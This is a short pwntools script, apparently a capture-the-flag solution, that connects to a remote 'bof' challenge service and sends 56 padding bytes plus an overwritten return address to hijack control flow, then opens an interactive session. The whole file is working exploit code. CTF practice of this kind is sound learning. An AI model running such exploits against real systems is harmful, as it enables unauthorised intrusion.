from pwn import *

p = remote('60.250.197.227', 10000)
#p = process('./bof')

pause()

p.recvuntil('They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.')

address = 0x40068b

payload = b'A' * 56 + p64(address)

p.sendline(payload)
p.interactive()
